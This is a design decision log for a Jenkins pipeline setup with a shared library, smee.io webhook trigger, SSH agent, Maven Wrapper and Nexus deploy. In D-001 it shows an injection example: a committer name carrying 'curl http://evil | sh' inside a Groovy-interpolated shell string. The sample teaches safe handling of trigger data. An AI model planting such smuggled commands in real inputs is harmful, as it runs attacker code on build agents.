# Decisions — Task 1: Jenkins pipeline

Each significant decision gets one entry. Newest at the bottom.

---

## D-001: Shared library location — same repo, subfolder via `libraryPath`

- **Date:** 2026-11-10
- **Context:** The task requires a Groovy Shared Library with a `prepareEnv` function (R-6, R-7).
  The library must live in some SCM location that Jenkins loads as a Global Pipeline Library.
- **Options considered:**
  1. Separate repository — pros: library and app have separate write access (clear trust
     boundary); this is the layout shown in the Jenkins handbook. Cons: second repo to submit
     and keep in sync; the reviewer has to clone two repos.
  2. Same repository, subfolder `1-jenkins-pipeline/shared-library/`, loaded with the
     `libraryPath` option of the SCM retriever — pros: one repo to submit and review; library
     and pipeline change together. Cons: the trust boundary is lost (see Risk below).
- **Decision:** Option 2 — same repo, `libraryPath: "1-jenkins-pipeline/shared-library/"`,
  configured with JCasC under `unclassified.globalLibraries.libraries[].retriever.modernSCM`.
- **Why:** A single repo is simpler to submit, review and run, and the assignment asks for one
  public repo.
- **Risk — trust boundary:**
  - Global Pipeline Libraries are *trusted*: they run outside the Groovy sandbox and can call any
    Jenkins/Java API. The Jenkins handbook warns that anyone who can push to the library's
    repository can get unlimited access to Jenkins.
  - With the library in the same repo as the app code, anyone who can push app code can also
    change trusted library code. In practice, write access to the app repo becomes
    admin-level access to Jenkins.
  - Related plugin hardening: CVE-2022-29047 / SECURITY-1951 (Jenkins advisory 2022-04-12).
    The `library` step with a retriever pointing to the *same repository and revision* as the
    current build let untrusted pull-request authors change Pipeline behavior in Multibranch
    jobs. Fixed versions (`workflow-cps-global-lib` 566.vd0a_a_3334a_555 / 2.21.3) abort
    retrieval when that revision is untrusted. This fix does **not** protect our setup: we use a
    Global Library on a normal pipeline job, so a push to `main` changes trusted code with no
    extra check. The advisory shows that the Jenkins project treats "library in the same repo
    as the code it builds" as a real attack path.
- **Mitigations in this assignment:**
  - Single owner repo; only I can push to `main`.
  - `defaultVersion: main` and `allowVersionOverride: false`: a Jenkinsfile cannot load the
    library from another branch.
  - `implicit: false`: the Jenkinsfile loads the library explicitly with `@Library`, so
    readers can see where it comes from.
  - `libraryPath` rejects `..` and absolute paths, so the library cannot point outside the repo.
  - Trigger data is handled as data, never as code. Committer name, commit message, branch
    and sha come from the SCM and are attacker-controlled (anyone can set `git config user.name`
    to any string). Rule for the library and the Jenkinsfile:
    - Pass these values only as environment variables.
    - Never put them into a Groovy-interpolated shell string.
    - Maven reads them directly (`${env.SCM_COMMITTER}` in `pom.xml`), with no shell involved.

    ```groovy
    // UNSAFE: Groovy inserts the value before the shell parses the command.
    // A committer named  x; curl http://evil | sh  runs a second command on the agent.
    sh "echo Built by ${env.SCM_COMMITTER}"

    // SAFE: single quotes, no Groovy interpolation; the shell expands the variable as data.
    sh 'echo "Built by $SCM_COMMITTER"'
    ```
- **What I would do in production:**
  - Separate library repository with restricted write access (a small platform team, CODEOWNERS,
    branch protection, required reviews).
  - Release the library as tagged versions and pin them in the Jenkinsfile
    (`@Library('tase-shared-lib@v1.2.0') _`), with tag protection rules.
  - Keep `allowVersionOverride` off for trusted libraries, or use folder-level (sandboxed)
    libraries for code that teams own themselves.
- **Trade-offs:** Simpler submission in exchange for a weaker trust boundary. This is
  acceptable for a single-author demo and documented here.
- **Sources:**
  - https://www.jenkins.io/doc/book/pipeline/shared-libraries/
  - https://www.jenkins.io/doc/book/pipeline/jenkinsfile/#injection-via-interpolation
  - https://javadoc.jenkins.io/plugin/pipeline-groovy-lib/org/jenkinsci/plugins/workflow/libs/SCMBasedRetriever.html
  - https://github.com/jenkinsci/pipeline-groovy-lib-plugin (SCMBasedRetriever.java, help-libraryPath.html)
  - https://github.com/jenkinsci/configuration-as-code-plugin/tree/master/demos/pipeline-groovy-lib
  - https://www.jenkins.io/security/advisory/2022-04-12/#SECURITY-1951
  - https://nvd.nist.gov/vuln/detail/CVE-2022-29047

---

## D-002: SCM trigger — GitHub webhook → smee.io → Generic Webhook Trigger

- **Date:** 2026-11-10
- **Context:** R-2 (trigger from SCM change) and R-8 (`prepareEnv` passes SCM *trigger
  parameters*, e.g. the committer, into the pipeline). Jenkins runs locally behind NAT (home
  router + WSL2/Docker Desktop), so GitHub cannot open a connection to it.
- **Options considered:** Generic Webhook Trigger (GWT) + smee.io relay. Briefly rejected:
  the GitHub plugin (`githubPush()`) and `pollSCM` — neither passes the trigger payload into
  the pipeline, so they do not meet R-8 as written.
- **Decision:** GWT + smee.io. A `smee-client` container forwards GitHub `push` events to
  `http://jenkins:8080/generic-webhook-trigger/invoke`.
- **Why:** It is the only option where the SCM itself sends the parameters into the pipeline,
  which is what the task asks for. smee-client opens an *outbound* connection to smee.io, so no
  inbound port has to be opened on the router or the machine.
- **Details:**
  - Trigger defined in Job DSL (JCasC), not in the Jenkinsfile. A trigger in the Jenkinsfile is
    registered only after the first manual run.
  - Filter: `regexpFilterText: '$WEBHOOK_REF $WEBHOOK_AFTER'` must match
    `^refs/heads/main (?!0{40})[0-9a-f]{40}$`: only pushes to `main`, and not a branch deletion
    (GitHub sends `after` = 40 zeros and no `head_commit` for a deletion).
  - No path filter: this repository holds three tasks, so a push to `main` that changes only
    task 2 or task 3 also starts a build. The build still succeeds (it builds the unchanged app
    and uploads a new version). Not required by the task; kept simple on purpose. In production:
    one repository per application, or a path filter on the changed files.
  - Token: Secret text credential `gwt-token` (`tokenCredentialId`), value from `.env` as a
    Docker secret. smee-client reads it, and the channel URL, from Docker secret files at start
    and puts the token in the target URL (`?token=...`). Neither value is in `docker inspect`.
  - `printPostContent(false)`: the raw payload is not written to the build log.
  - `prepareEnv` falls back to git when the build is started manually.
  - smee-client: small image `node:24.22-alpine3.24` + `smee-client@5.0.0` (pinned), runs as the
    `node` user, `mem_limit: 128m`, no published port.
- **Verified:**
  - Simulated payloads posted inside the network: wrong token → no job found; push to another
    branch → not triggered; `after` = zeros on `main` → not triggered; push to `main` → build #4,
    `prepareEnv - source: webhook`.
  - Real GitHub push → smee → Jenkins: build #5, cause `Push to main by reutyadid`,
    `SCM_PUSHER=reutyadid`, `hello-app-1.0.5.jar` in Nexus. GitHub's `ping` event on webhook
    creation was received (HTTP 200) and did not start a build.
- **Security:**
  - Token-triggered builds run with SYSTEM privileges (documented by the plugin). Acceptable:
    the Jenkinsfile comes from my own repo.
  - The smee channel URL acts like a password: anyone who knows it can read the webhooks and post
    a fake payload, and smee-client forwards it with the token. A fake payload can name any real
    commit of `main` (it passes the filter) and any committer / pusher name, so the build would
    deploy a jar with false `SCM-*` values. The URL is kept in `.env`, never committed. smee-client
    gets the URL and the token as arguments (visible in `docker top`) and prints both in its log
    line ("Forwarding <url> to ...?token=..."), so anyone with Docker access on this machine can
    read them.
  - smee.io is for development only. In production: a real inbound endpoint (reverse proxy /
    TLS) and HMAC verification of `X-Hub-Signature-256`, so a payload that GitHub did not sign
    is rejected.
- **Trade-offs:** Depends on a public third-party relay (smee.io) being available.
- **Sources:**
  - https://plugins.jenkins.io/generic-webhook-trigger/
  - https://docs.github.com/en/webhooks/webhook-events-and-payloads#push
  - https://docs.github.com/en/webhooks/testing-webhooks
  - https://github.com/probot/smee-client (smee-client, npm package `smee-client`)
  - https://hub.docker.com/_/node (official Node.js image, Alpine variant)

---

## D-003: Interpretation of the task wording

- **Date:** 2026-11-10
- **Context:** Three phrases in the task text can be read in more than one way (R-3, R-4, R-5, R-8).
- **Decision:**
  1. "build an artifact" = compile + run unit tests (`mvnw clean test`; `clean` so every build starts from an empty `target/`).
     "pack the artifact" = create the jar (`mvnw package`).
  2. "upload to repo" = an artifact repository (Nexus, hosted Maven repo `maven-releases`),
     not a git repository.
  3. "who was the code committer" = the `committer` of the head commit in the push payload
     (`$.head_commit.committer.name`). Author and pusher are captured too, because they can be
     different people (e.g. a commit made in the GitHub web editor has committer "GitHub").
- **Why:** Each phrase maps 1:1 to a standard Maven lifecycle phase / GitHub payload field,
  with no custom steps.
- **Sources:**
  - https://maven.apache.org/guides/introduction/introduction-to-the-lifecycle.html
  - https://docs.github.com/en/webhooks/webhook-events-and-payloads#push

---

## D-004: Trigger parameters set and build description

- **Date:** 2026-11-10
- **Context:** R-8 — `prepareEnv` must pass SCM trigger parameters into the pipeline.
  We need a small, standard set that answers: what was built, from where, by whom.
- **Decision:** `prepareEnv` sets 7 environment variables:

  | Env var         | Push payload (JSONPath)          | Webhook env var     | Git fallback (manual run)      |
  |-----------------|----------------------------------|---------------------|--------------------------------|
  | `SCM_BRANCH`    | `$.ref` (strip `refs/heads/`)    | `WEBHOOK_REF`       | `GIT_BRANCH` (strip `origin/`) |
  | `SCM_COMMIT`    | `$.after`                        | `WEBHOOK_AFTER`     | `GIT_COMMIT`                   |
  | `SCM_COMMITTER` | `$.head_commit.committer.name`   | `WEBHOOK_COMMITTER` | `git log -1 --format=%cn`      |
  | `SCM_AUTHOR`    | `$.head_commit.author.name`      | `WEBHOOK_AUTHOR`    | `git log -1 --format=%an`      |
  | `SCM_PUSHER`    | `$.pusher.name`                  | `WEBHOOK_PUSHER`    | `manual`                       |
  | `SCM_REPO`      | `$.repository.full_name`         | `WEBHOOK_REPO`      | `GIT_URL` (owner/name)         |
  | `SCM_MESSAGE`   | `$.head_commit.message`          | `WEBHOOK_MESSAGE`   | `git log -1 --format=%s`       |

  - `WEBHOOK_*` variables: set by Generic Webhook Trigger from the push payload (Job DSL,
    D-002). If `WEBHOOK_AFTER` is empty, the run was not started by the webhook.
  - The Jenkinsfile turns off the automatic checkout (`skipDefaultCheckout()`) and checks out in
    the Prepare stage: `WEBHOOK_AFTER` on a webhook run, `*/main` on a manual run. So each build
    builds exactly the commit it reports, even if a newer push moved `main` meanwhile. The
    `checkout` step returns `GIT_COMMIT` / `GIT_BRANCH` / `GIT_URL`, which are passed to
    `prepareEnv(gitVars)` for the manual-run fallback. (The Jenkinsfile itself is always read
    from the head of `main`.)
    Verified: two simulated webhooks sent back to back for older commits `3f147af` and `03e3d34`
    gave two separate builds (#9, #10); each checked out and reported its own commit while `main`
    was at `92a943a`. Manual build #11 checked out `main` and used the git values.
  - `GIT_BRANCH` comes from the checkout result (the workspace is on a detached HEAD, so
    `git rev-parse --abbrev-ref HEAD` would only print `HEAD`).
  - `prepareEnv` fails the build if `SCM_COMMIT` or `SCM_COMMITTER` is empty.
  - All 7 are printed in the Prepare stage log.
  - 6 are embedded in `MANIFEST.MF` (all except `SCM_MESSAGE`: free text, can be multi-line).
    Maven reads them as `${env.SCM_*}`. In a local build without these env vars the literal
    text `${env.SCM_*}` stays in the manifest; this is accepted, because only CI deploys.
  - The manifest also gets `Main-Class`, so the jar runs with `java -jar` (a simple smoke test).
  - Build description: `<short sha> by <committer>`, e.g. `9f3c2a1 by Reut Yadid`,
    set at the end of `prepareEnv` with `currentBuild.description`.
- **Why:**
  - Branch + commit: the minimum to reproduce what was built.
  - Committer, author, pusher: can be three different people; capturing all costs nothing.
  - `SCM_` prefix, not `GIT_`: the Jenkins Git plugin already sets `GIT_COMMIT`, `GIT_BRANCH`, ...
    Different names make it clear which values came from the webhook.
  - The build description shows who and which commit directly in the build history list.
- **Security / privacy:**
  - No e-mail addresses: the repo is public and artifacts are stored in Nexus; personal data
    that is not needed is not collected.
  - All values are attacker-controlled data: handled only as env vars, never in
    Groovy-interpolated shell strings (see D-001).
  - The build description is rendered by the default "Plain text" markup formatter, so HTML in a
    committer name is shown as text, not executed (no XSS). We keep that default.
- **Sources:**
  - https://docs.github.com/en/webhooks/webhook-events-and-payloads#push
  - https://plugins.jenkins.io/generic-webhook-trigger/
  - https://www.jenkins.io/doc/book/security/markup-formatter/

---

## D-005: Builds run on a dedicated agent; controller has 0 executors

- **Date:** 2026-11-10
- **Context:** Pipeline steps (`mvnw test`, `mvnw deploy`) run code from the repo. We must decide
  where that code executes (R-3, R-4, R-5).
- **Options considered:**
  1. Built-in node (controller executors > 0) — simplest, one container less. But builds get
     the same file-system access as the Jenkins process, including `JENKINS_HOME` (the
     encryption key and all stored credentials).
  2. Dedicated static agent container, controller executors = 0 — official recommendation
     (Controller Isolation). Separate file system, no access to `JENKINS_HOME`.
  3. Dynamic agents (Docker Cloud plugin) — clean container per build, but the controller needs
     the Docker socket, which is root-equivalent on the host. Too complex for this task.
- **Decision:** Option 2. One agent container based on the official `jenkins/ssh-agent:9.3.2-jdk21`
  image (JDK 21 + sshd, no custom Dockerfile; `mem_limit: 1g`, no published port). Controller: `numExecutors: 0` in JCasC.
- **Why:** Follows the official Jenkins security guidance at the cost of one small container.
- **Trade-offs:** ~0.5–1 GB extra memory; one more connection to configure (see D-006).
- **Sources:**
  - https://www.jenkins.io/doc/book/security/controller-isolation/
  - https://www.jenkins.io/doc/book/using/using-agents/
  - https://hub.docker.com/r/jenkins/ssh-agent

---

## D-006: Agent connection — SSH, without host key verification

- **Date:** 2026-11-10
- **Context:** The controller must connect to the agent container from D-005, fully defined as
  code (JCasC), with no manual step after `docker compose up`.
- **Decision:** SSH launcher (SSH Build Agents plugin). The controller connects to the agent
  over the internal Docker network. Port 22 of the agent is **not** published to the host.
  - A script generates an ed25519 key pair (`ssh-keygen`) into a git-ignored folder.
  - Private key → Docker secret → JCasC reads it with `${readFile:/run/secrets/...}` into an
    SSH credential. A file, not an env var: JCasC docs warn that env vars are readable by
    jobs and admins.
  - Public key → `JENKINS_AGENT_SSH_PUBKEY` in `.env` (not a secret).
- **Why SSH:** Keys are known before startup, so the whole setup is declarative. An inbound
  agent (agent connects to controller) is also a common, valid approach — it is the standard for
  dynamic agents such as Kubernetes pods — but its secret is created by the controller only after
  it starts, so a static Compose setup needs an extra step to fetch it.
- **Private key file mode 644:** Compose secrets without Swarm are bind mounts that keep the
  host owner and mode. The jenkins user in the container is uid 1000; with mode 600 only the
  host user who created the file could read it, so it works only when that uid is also 1000.
  644 makes it readable on any host. Accepted: the key opens only the agent container, which has
  no published port, and the file stays on the reviewer's machine in a git-ignored folder.
  In production: a secrets manager, or Swarm/Kubernetes secrets with an explicit owner.
- **Host key verification:** `nonVerifyingKeyVerificationStrategy`.
  - Why: the official `jenkins/ssh-agent` image deletes its host keys at build time and creates
    new ones (`ssh-keygen -A`) every time the container starts, so the agent's host key changes on
    every re-create.
  - Risk: man-in-the-middle. Accepted here because port 22 is reachable only inside the private
    Docker network; an attacker would already need to be inside that network.
  - Alternative considered: "Manually trusted key" (trust on first use). Breaks after the agent
    container is re-created, unless the host keys are kept in an extra volume.
- **What I would do in production:** verify host keys — a fixed host key for the agent
  (mounted as a secret) with "Known hosts file" or "Manually provided key" verification; or use
  ephemeral inbound agents (e.g. Kubernetes), where there is no SSH host key at all.
- **Trade-offs:** Simpler setup in exchange for no host identity check on an internal network.
- **Sources:**
  - https://github.com/jenkinsci/ssh-agents-plugin/blob/main/doc/CONFIGURE.md
  - https://github.com/jenkinsci/docker-ssh-agent (setup-sshd, Dockerfile)
  - https://github.com/jenkinsci/configuration-as-code-plugin/blob/master/docs/features/secrets.adoc
  - https://www.jenkins.io/doc/book/using/using-agents/

---

## D-007: Jenkins setup as code — plugins.txt + JCasC + Job DSL

- **Date:** 2026-11-10
- **Context:** The reviewer must get a fully configured Jenkins with one command, without the
  setup wizard or clicks in the UI (README goal: running in under 5 minutes).
- **Options considered:**
  1. Manual setup in the UI — not reproducible, not reviewable in git. Rejected.
  2. Groovy init scripts (`init.groovy.d`) — imperative calls to internal Jenkins APIs; harder
     to read and fragile across versions. The older approach, replaced by JCasC.
  3. Everything as code — plugins, system configuration and jobs in files.
- **Decision:** Option 3, three layers:
  - **Plugins:** `plugins.txt` with pinned versions, installed in the Dockerfile with
    `jenkins-plugin-cli` (official image tooling).
  - **System configuration:** JCasC (`casc.yaml`) — admin user, `numExecutors: 0`, SSH agent,
    credentials, Global Pipeline Library. Setup wizard disabled with
    `-Djenkins.install.runSetupWizard=false`.
  - **Job:** the `jobs:` section of JCasC runs a Job DSL script that creates the pipeline job
    (SCM, `scriptPath`, Generic Webhook Trigger).
- **Why:**
  - `docker compose up` gives the same Jenkins every time; every setting is in a file I can
    explain line by line.
  - JCasC configures Jenkins itself; Job DSL creates jobs; the Jenkinsfile defines what the job
    does. JCasC delegates job creation to Job DSL — the pattern in the official JCasC demos.
  - A trigger defined in Job DSL is registered at startup, without a first manual run (D-002).
  - JCasC also has native `items:` support, but the official demo covers Freestyle jobs only;
    Job DSL is the documented way for pipeline jobs.
- **Not used:** Ansible. On a laptop it would only wrap `docker compose up` and add a
  prerequisite for the reviewer; it does not replace JCasC for configuring Jenkins. Its place in
  production (host provisioning) is noted in the README.
- **Security:** Secrets (admin password, SSH key, Nexus deploy password) are read from Docker
  secret files with `${readFile:...}`, not from environment variables. Compose creates them from
  `.env` (`secrets: ... environment:`) and from `secrets/agent_key` (git-ignored). Verified: no
  secret value in `docker inspect` or in the Jenkins log.
- **Implementation:**
  - Image `jenkins/jenkins:2.580.2-lts-jdk21` (LTS, Java 21). `plugins.txt` pins 8 direct plugins
    and all 60 dependencies; the list was generated once with `jenkins-plugin-cli` on that image.
  - `casc.yaml` is copied into the image (outside the `jenkins-home` volume), so a rebuilt image
    always applies the config from git.
  - Login required for everything (`loggedInUsersCanDoAnything`, `allowAnonymousRead: false`);
    anonymous API call returns 403.
  - Non-secret values (`NEXUS_DEPLOY_USER`, `GIT_REPO_URL`) come from `.env` as environment
    variables; Compose stops with an error if one is missing (`${VAR:?}`).
  - The library SCM is written as `gitSource:`, the name the JCasC export uses
    (`/configuration-as-code/export`), together with `libraryPath`.
  - Memory: controller `-Xmx512m` in a 1 GB container; measured ~0.5 GB after start.
- **Trade-offs:** Two DSLs to learn (JCasC YAML + Job DSL Groovy).
- **Sources:**
  - https://plugins.jenkins.io/configuration-as-code/
  - https://github.com/jenkinsci/configuration-as-code-plugin/tree/master/demos/jobs
  - https://github.com/jenkinsci/configuration-as-code-plugin/blob/master/docs/features/secrets.adoc
  - https://plugins.jenkins.io/job-dsl/
  - https://github.com/jenkinsci/docker/blob/master/README.md

---

## D-008: Java 21 everywhere; Maven 3.10.0 via Maven Wrapper

- **Date:** 2026-11-10
- **Context:** Jenkins LTS (2.568.x) runs only on Java 21 or 25. The agent image has a JDK but
  no Maven. We need one Java version and a reproducible way to get Maven (R-3, R-4, R-5).
- **Decision:**
  - **Java 21** for the controller, the agent and the app (`maven.compiler.release=21`).
  - **Maven 3.10.0** (latest stable; Maven 4 is still a preview "not safe for production").
  - Maven is provided by the **Maven Wrapper** (`mvnw`), committed in `app/`, type `source`.
    Both downloads are verified: `wrapperSha256Sum` (the wrapper jar) and
    `distributionSha256Sum` (the Maven zip).
  - Why type `source` (see T-001): `only-script` downloads `.zip` or `.tar.gz` depending on
    whether `unzip` exists, but takes one checksum; `script` needs `curl`/`wget` to fetch the
    wrapper jar. The agent image has none of these tools. With `source`, a small committed Java
    file (`MavenWrapperDownloader.java`) fetches the wrapper jar, and the jar downloads and
    unpacks the zip in Java — same file and checksum everywhere, no binary in git.
  - A Docker volume for the agent's `~/.m2` caches Maven and dependencies between builds.
- **Options considered (Maven on the agent):**
  1. Maven Wrapper — no custom agent image; same Maven version for me, the reviewer and CI;
     official Apache tool. Cost: one download (~10 MB) on the first build.
  2. Custom agent image with Maven — extra Dockerfile to maintain; the version lives in the
     image, not next to the code.
  3. Jenkins tool installer — ties the build to Jenkins; local builds may use another version.
- **Why:** One Java version removes "works on my machine" problems. Java 21 is the most widely
  adopted LTS and is supported by Jenkins until Sep 2027. The wrapper pins the Maven version in
  the repo, next to the code it builds.
- **Note:** No Java/Maven is installed in my WSL. The wrapper is generated once with the
  official `maven` Docker image; local builds and tests run on the agent image
  (`jenkins/ssh-agent:9.3.2-jdk21`), so they exercise exactly what CI runs (command in T-001).
- **Trade-offs:** Java 25 has a longer support window (Jenkins until Sep 2029) but less tooling
  maturity today.
- **Sources:**
  - https://www.jenkins.io/doc/book/platform-information/support-policy-java/
  - https://maven.apache.org/download.cgi
  - https://maven.apache.org/tools/wrapper/

---

## D-009: Unique version per build — CI-friendly `${revision}` + flatten-maven-plugin

- **Date:** 2026-11-10
- **Context:** Nexus `maven-releases` rejects re-deploying an existing version (HTTP 409, verified), so
  every build must deploy a new version (R-5).
- **Options considered:**
  1. CI-friendly `${revision}` + `flatten-maven-plugin` — version from the build number;
     `pom.xml` in git is never changed. Cost: ~15 lines of plugin config.
  2. SNAPSHOT to `maven-snapshots` — no extra config, but not a release artifact, usually
     cleaned up, and not linked to a build number.
  3. `versions:set` before deploy — no plugin in the POM, but the POM in the workspace is
     changed during the build.
- **Decision:** Option 1.
  - `pom.xml`: `<version>${revision}</version>`, default `<revision>1.0.0-SNAPSHOT</revision>`
    so local builds work.
  - Jenkinsfile: `-Drevision=1.0.${BUILD_NUMBER}` → `1.0.12`, `1.0.13`, ...
  - `flatten-maven-plugin` in `resolveCiFriendliesOnly` mode writes `.flattened-pom.xml` with
    the real version, and that file is the POM deployed to Nexus.
- **Why:**
  - Every artifact in Nexus maps directly to the Jenkins build that produced it.
  - Without flatten, Maven 3 deploys the POM as-is, with the literal `${revision}` in it; the
    official docs say such artifacts are "not consumable by Maven". Maven 4 does this natively,
    but it is not GA yet.
- **Risks:**
  - Build numbers restart at 1 if the Jenkins volume is deleted (`docker compose down -v`); then
    deploy fails with HTTP 409 because `1.0.1` already exists. For the demo: reset Nexus and
    Jenkins volumes together (documented in README).
  - Pin a `flatten-maven-plugin` version released at least a few weeks ago (1.9.0 was released
    2026-11-06 — too new).
- **Trade-offs:** Extra plugin config in the POM, in exchange for an unchanged POM in git.
- **Sources:**
  - https://maven.apache.org/maven-ci-friendly.html
  - https://www.mojohaus.org/flatten-maven-plugin/

---

## D-010: Upload with `mvn deploy`

- **Date:** 2026-11-10
- **Context:** R-5 — upload the packed artifact to the artifact repository (Nexus).
- **Options considered:**
  1. `mvn deploy` — last phase of the Maven lifecycle; uploads the jar and the POM and updates
     the repository metadata. Target in `distributionManagement`, login in `settings.xml`.
  2. Nexus Artifact Uploader plugin — extra Jenkins dependency; every file, version and
     coordinate must be described again by hand.
  3. `curl` to the Nexus REST API — manual and fragile; POM and metadata are not handled.
- **Decision:** Option 1. One command in the Upload stage:
  `./mvnw -s settings.xml deploy -Drevision=1.0.${BUILD_NUMBER}`.
- **Why:** Standard Maven, maps 1:1 to "upload to repo", no extra plugin.
- **Verified** (manual `mvnw deploy` on the agent image, inside the Compose network):
  - **Server id match.** `distributionManagement` and `settings.xml` both use `nexus-releases`.
    With a different id in `settings.xml`, Maven sends no credentials and Nexus answers
    `HTTP Status: 401`.
  - **Credentials bound to the host.** Maven 3.10 warned that the server had no
    `<repositoryOrigins>`. `settings.xml` (model 1.3.0) now lists `http://nexus:8081`, so the
    password is sent only to that host, even if another repository reuses the id. This works
    in Maven's default scope (`origin`): once a server lists an origin, its credentials are not
    sent to another origin. `strict` only adds that a server *without* origins gets no
    credentials, so the pipeline does not need the flag. Also tested with
    `-Dmaven.repository.credentialScope=strict`: no warning, upload works.
  - **HTTP blocker.** Since Maven 3.8.1 the `maven-default-http-blocker` mirror blocks HTTP
    repositories (CVE-2021-26291). It applies to downloads, not to deploy: the upload to
    `http://nexus:8081` worked. Dependencies still come from Maven Central over HTTPS.
    In production: HTTPS for Nexus.
  - **Redeploy.** Deploying the same version again fails with `HTTP Status: 409` (release
    repository: no overwrite). Each build needs a new version (D-009).
  - The password does not appear in the Maven log.
  - Command used (from `1-jenkins-pipeline/app`, with Nexus running and `nexus/setup.sh` done):
    ```bash
    set -a; source ../.env; set +a
    docker run --rm --network tase-jenkins_default -u "$(id -u):$(id -g)" -e HOME=/tmp \
      -e NEXUS_DEPLOY_USER -e NEXUS_DEPLOY_PASSWORD -v "$PWD:/app" -w /app \
      --entrypoint ./mvnw jenkins/ssh-agent:9.3.2-jdk21 -B -s settings.xml deploy -Drevision=1.0.2
    # expected: Uploaded ... hello-app-1.0.2.jar ... BUILD SUCCESS
    ``` Nexus memory during the upload: ~1.0 GB of 2 GB.
- **Sources:**
  - https://maven.apache.org/plugins/maven-deploy-plugin/
  - https://maven.apache.org/settings.html#servers (`repositoryOrigins`, `credentialScope`)
  - https://maven.apache.org/docs/3.10.0/release-notes.html
  - https://maven.apache.org/docs/3.8.1/release-notes.html

---

## D-011: Nexus credentials — dedicated deploy user + `withCredentials` and `settings.xml`

- **Date:** 2026-11-10
- **Context:** `mvn deploy` (D-010) needs a Nexus login. We must choose which Nexus user deploys
  and how its password reaches Maven without leaking.
- **Decision — Nexus user:** a dedicated deploy user, not `admin` (least privilege).
  - `nexus/setup.sh` (bash + `curl` to the Nexus REST API) runs once after Nexus starts:
    1. Changes the initial random admin password (`/nexus-data/admin.password`) to the one in `.env`.
    2. Creates a role with only the privileges needed to deploy to `maven-releases`.
       Verified: `nx-repository-view-maven2-maven-releases-read`, `-add` and `-edit`.
       With only `read` + `add`, even the first upload returned 403 (T-004). No delete, no admin
       privileges, no other repository: an upload to `maven-snapshots` returns 403.
    3. Creates the deploy user with that role.
  - The script is idempotent (safe to run twice) and checked with `shellcheck`.
- **Decision — password to Maven:**
  - `settings.xml` is committed and holds no secret: `<server><id>nexus-releases</id>` with
    `${env.NEXUS_DEPLOY_USER}` / `${env.NEXUS_DEPLOY_PASSWORD}` (same names as in `.env`).
  - The Jenkinsfile wraps only the deploy command in
    `withCredentials([usernamePassword(credentialsId: 'nexus-deploy', ...)])`; the values exist as
    env vars only during that command and are masked as `****` in the log.
  - Single-quoted `sh '...'` so Groovy does not interpolate the secret (see D-001).
- **Password path:** `.env` (git-ignored) → `setup.sh` creates the user; and → Docker secret file →
  JCasC `${readFile:...}` → Jenkins credential `nexus-deploy` → `withCredentials` → `settings.xml`
  → Nexus. Never in git, never in the log, never stored on the agent.
- **Options considered:**
  1. Deploy as `admin` — simplest, but a leak from Jenkins gives full control of Nexus. Rejected.
  2. Config File Provider plugin (managed `settings.xml` in Jenkins) — works, but an extra plugin
     and the file is not in git next to the code. Rejected.
- **Verified:** Nexus Community Edition requires EULA acceptance before uploads (see D-012).
- **Sources:**
  - https://help.sonatype.com/repomanager3/nexus-repository-administration/access-control/privileges
  - https://help.sonatype.com/repomanager3/using-nexus-repository/uploading-components
  - https://www.jenkins.io/doc/pipeline/steps/credentials-binding/
  - https://maven.apache.org/settings.html#servers

---

## D-012: Nexus container — image, memory, exposure

- **Date:** 2026-11-10
- **Context:** Nexus is the upload target (D-010). It must run on a laptop with WSL limited to
  6 GB RAM, next to the Jenkins controller and agent.
- **Decision:**
  - Image `sonatype/nexus3:3.98.1` (Alpine, Java 21, runs as UID 200 — not root). Pinned tag.
  - Memory: `-Xms1g -Xmx1g -XX:MaxDirectMemorySize=512m` via `INSTALL4J_ADD_VM_PARAMS`, and
    `mem_limit: 2g` on the container. The image default (`-Djava.util.prefs.userRoot=...`) is
    repeated, because setting the variable replaces it.
  - Port `127.0.0.1:8081:8081`: reachable from this machine only.
  - Named volume `nexus-data`: data survives `docker compose down` (removed only with `-v`).
  - Healthcheck: `curl` to `/service/rest/v1/status/writable` (200 when Nexus accepts writes,
    not only reads), `start_period: 300s` because the first start took ~4 minutes.
  - No `container_name`: the service name `nexus` is already the DNS name inside the Compose
    network, and a fixed name would clash with any other container called `nexus`.
- **Why:**
  - The common example values (2703m heap + 2703m direct memory, ~5.4 GB) are sized for an
    8 GB host and do not fit here. One small Maven repository needs far less.
  - Measured: healthy after ~4 minutes, ~1.2 GB used of the 2 GB limit.
- **Verified on 3.98.1:**
  - Community Edition blocks uploads until the EULA is accepted. An upload as `admin` returned
    `403 You must accept the End User License Agreement (EULA) ...`.
  - The REST API has `GET/POST /service/rest/v1/system/eula` (`"accepted": false/true`).
  - The log also warns that the mandatory telemetry notice must be acknowledged in the UI. Since
    3.98, if telemetry reporting fails for 30 days, Nexus becomes read-only. Not an issue for a
    short-lived demo; noted in the README.
- **Decision — EULA:** accepting a license is a legal choice of the person running the demo, so it
  is never accepted on their behalf: `nexus/setup.sh` accepts it only if `.env`
  has `NEXUS_ACCEPT_EULA=true`, otherwise it stops with a message and the EULA link, before any
  change to Nexus. After accepting, it reads the status again and fails if it is not `true`.
  `.env.example` ships `NEXUS_ACCEPT_EULA=false` (same pattern as `ACCEPT_EULA` in other images).
- **Anonymous access:** already disabled by default in 3.98.1 (verified:
  `GET /service/rest/v1/security/anonymous` returns `"enabled" : false`). Left at the default;
  the setup script does not change it. Every request to Nexus needs a login.
- **Risks:** 1 GB heap is below Sonatype's sizing for real workloads; fine for one demo repo.
- **Sources:**
  - https://github.com/sonatype/docker-nexus3
  - https://help.sonatype.com/en/configuring-the-runtime-environment.html
  - https://help.sonatype.com/en/sonatype-nexus-repository-3-98-0-release-notes.html
  - https://links.sonatype.com/products/nxrm3/docs/ce-onboarding
